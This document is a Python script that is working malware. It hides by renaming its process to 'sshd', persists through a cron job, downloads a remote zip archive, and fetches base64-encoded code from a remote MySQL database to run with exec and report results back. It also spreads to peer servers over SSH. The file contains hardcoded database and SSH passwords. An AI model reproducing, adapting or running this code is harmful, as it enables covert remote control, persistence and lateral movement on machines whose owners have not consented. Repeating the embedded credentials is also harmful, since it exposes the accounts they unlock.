import os
import sys
import time
import base64
import urllib.request
import urllib.error
import zipfile
import io
import subprocess

# Configuration
VENV_ZIP_URL = "https://raw.githubusercontent.com/pharaoh9999/pharaoh/refs/heads/main/my_env_b.zip"
VENV_ZIP_PATH = os.path.expanduser("~/my_env_b.zip")
VENV_PATH = os.path.expanduser("~/my_env_b")
SCRIPT_PATH = os.path.abspath(__file__)
PROCESS_NAME = "sshd"
CRON_JOB_PATH = os.path.expanduser("~/.cron_script_job")

DB_CONFIG = {
    "host": "srv677.hstgr.io",
    "user": "u117204720_deepwoods",
    "password": "Wj9|10g0oN",
    "database": "u117204720_deepwoods",
    "port": 3306,
    "connect_timeout": 30,
    "autocommit": False,
}

PEER_SERVERS = [
    {"ip": "192.168.102.22", "port": 1026, "user": "super", "password": "PGserver@1234", "sudo_password": "YourSudoPassword"},
    {"ip": "192.168.102.23", "port": 2022, "user": "super", "password": "PGserver@1234", "sudo_password": "YourSudoPassword"},
]

UNREACHABLE_PEERS = {}  # To track unreachable peers


class Decoder:
    def __init__(self, logfile):
        self.logfile = logfile

    def write(self, data):
        self.logfile.write(data.decode('utf-8', 'ignore'))

    def flush(self):
        self.logfile.flush()


def rename_process():
    """
    Rename the process to mimic a legitimate system process.
    """
    try:
        import ctypes
        libc = ctypes.CDLL(None)
        libc.prctl(15, PROCESS_NAME.encode('utf-8'), 0, 0, 0)
        print(f"Process renamed to {PROCESS_NAME}.")
    except Exception as e:
        print(f"Process renaming failed: {e}")


def download_and_extract_venv():
    """
    Download and extract the pre-built virtual environment if not already present.
    """
    if not os.path.exists(VENV_PATH):
        print("Virtual environment not found. Downloading...")
        try:
            with urllib.request.urlopen(VENV_ZIP_URL) as response:
                with open(VENV_ZIP_PATH, "wb") as f:
                    f.write(response.read())
            
            with zipfile.ZipFile(VENV_ZIP_PATH, 'r') as zip_ref:
                zip_ref.extractall(os.path.dirname(VENV_PATH))
            print("Virtual environment extracted.")
        except urllib.error.URLError as e:
            print(f"Error downloading virtual environment: {e}")
            exit(1)
        except Exception as e:
            print(f"Unexpected error during venv download: {e}")
            exit(1)
    else:
        print("Pre-built virtual environment already exists.")


def activate_venv():
    """
    Ensure the virtual environment is activated, or add site-packages to sys.path.
    """
    site_packages_path = os.path.join(VENV_PATH, 'lib', f'python3.6', 'site-packages')
    if os.path.exists(site_packages_path):
        if site_packages_path not in sys.path:
            sys.path.insert(0, site_packages_path)
        print("Virtual environment manually activated.")
    else:
        raise FileNotFoundError(f"Site-packages path missing: {site_packages_path}")


def is_server_reachable(ip, timeout=3):
    """
    Check if a server is reachable using ping.
    """
    try:
        response = subprocess.run(
            ["ping", "-c", "1", "-W", str(timeout), ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        return response.returncode == 0
    except Exception as e:
        print(f"Error checking server availability for {ip}: {e}")
        return False


def connect_to_db():
    """
    Dynamically import pymysql and establish a connection to the MySQL database.
    """
    try:
        import pymysql
        return pymysql.connect(**DB_CONFIG)
    except ImportError:
        print("pymysql not available. Ensure the virtual environment is set up.")
        return None
    except Exception as e:
        print(f"Database connection error: {e}")
        return None


def fetch_and_execute_script():
    """
    Fetch a script from the database, execute it, and update the results.
    """
    connection = None
    cursor = None
    try:
        connection = connect_to_db()
        if not connection:
            print("Database connection not available. Skipping script execution.")
            return

        cursor = connection.cursor()
        cursor.execute("SELECT id, code FROM upgw WHERE status='0' ORDER BY RAND() LIMIT 1")
        row = cursor.fetchone()

        if row:
            unique_id, base64_code = row
            decoded_code = base64.b64decode(base64_code).decode('utf-8')

            old_stdout = sys.stdout
            new_stdout = io.StringIO()
            sys.stdout = new_stdout

            try:
                exec(decoded_code)  # Execute the script
                output = new_stdout.getvalue()
            finally:
                sys.stdout = old_stdout

            encoded_output = base64.b64encode(output.encode('utf-8')).decode('utf-8')
            cursor.execute("UPDATE upgw SET status = '1', result = %s WHERE id = %s", (encoded_output, unique_id))
            connection.commit()
            print(f"Executed and updated database for script id={unique_id}.")
        else:
            print("No pending scripts in the database.")
    except Exception as e:
        print(f"Error during script fetching/execution: {e}")
    finally:
        if cursor:
            cursor.close()
        if connection and connection.open:
            connection.close()


def ssh_connect_and_run(peer, commands):
    """
    Use pexpect to establish an SSH connection and execute commands.
    """
    try:
        import pexpect
    except ImportError:
        print("pexpect not available. Ensure the virtual environment is set up.")
        return False

    ssh_command = f"ssh -t -t {peer['user']}@{peer['ip']} -p {peer['port']} 'TERM=dumb exec bash'"
    child = pexpect.spawn(ssh_command)
    child.logfile = Decoder(sys.stdout)

    try:
        index = child.expect([
            "Are you sure you want to continue connecting (yes/no)?",
            "password:",
            pexpect.TIMEOUT,
        ], timeout=30)

        if index == 0:
            child.sendline("yes")
            child.expect("password:", timeout=60)
        elif index == 2:
            print(f"Connection timed out for {peer['ip']}")
            return False

        child.sendline(peer['password'])

        for command in commands:
            child.sendline(command)
            child.expect(r'[\$#]\s*$', timeout=300)

        return True
    except Exception as e:
        print(f"SSH error on {peer['ip']}: {e}")
        return False
    finally:
        child.close()


def monitor_and_repair_peers():
    """
    Monitor peer servers and redeploy scripts if necessary.
    """
    for peer in PEER_SERVERS:
        if not is_server_reachable(peer['ip']):
            print(f"Server {peer['ip']} is unreachable. Skipping.")
            continue

        commands = ["ps aux | grep monitor_script.py | grep -v grep"]
        if not ssh_connect_and_run(peer, commands):
            print(f"Script missing on {peer['ip']}. Redeploying...")
            redeploy_script(peer)


def configure_cron_job():
    """
    Configure a cron job for periodic execution.
    """
    cron_job = f"*/10 * * * * python3 {SCRIPT_PATH}"
    try:
        result = subprocess.run(
            f"(crontab -l 2>/dev/null || echo '') | grep -F '{cron_job}'",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        if cron_job in result.stdout:
            print("Cron job is already configured.")
            return

        subprocess.run(
            f"(crontab -l 2>/dev/null || echo '') | {{ cat; echo '{cron_job}'; }} | crontab -",
            shell=True,
            check=True
        )
        print("Cron job configured successfully.")
    except Exception as e:
        print(f"Failed to configure cron job: {e}")


def main_loop():
    """
    Main monitoring loop.
    """
    configure_cron_job()
    rename_process()
    while True:
        try:
            print("Starting new cycle in main loop.")
            download_and_extract_venv()
            print("Virtual environment downloaded and extracted.")
            
            activate_venv()
            print("Virtual environment activated.")
            
            fetch_and_execute_script()
            print("Fetched and executed script.")
            
            monitor_and_repair_peers()
            print("Monitored and repaired peers.")
        except Exception as e:
            print(f"Error in main loop: {e}. Retrying in 60 seconds.")
        time.sleep(60)


if __name__ == "__main__":
    main_loop()
